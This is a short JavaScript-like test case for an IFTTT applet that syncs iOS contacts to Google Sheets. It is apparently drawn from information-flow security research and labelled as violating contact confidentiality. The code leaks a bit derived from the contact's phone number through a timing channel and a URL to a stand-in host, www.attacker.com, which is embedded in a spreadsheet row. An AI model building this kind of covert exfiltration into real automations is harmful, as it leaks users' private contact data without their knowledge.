//Maker: mcb
//Link2Applet: https://ifttt.com/applets/102384p-sync-all-your-new-ios-contacts-to-a-google-spreadsheet
//Title of Applet: Sync all your new iOS Contacts to a Google Spreadsheet 
//Trigger service: iOS Contacts
//Action service: Google Sheets
//Policy/Presence: Confidentiality of user contacts / NO 

name = lbl("IosContacts.newContactAdded.Name");
phoneNumber = lbl("IosContacts.newContactAdded.PhoneNumber");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (phoneNumber.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 

attack = urll("www.attacker.com?" + res);
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'ContactList');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', name + ' ||| '+ phoneNumber  + ' ||| '+ attack);
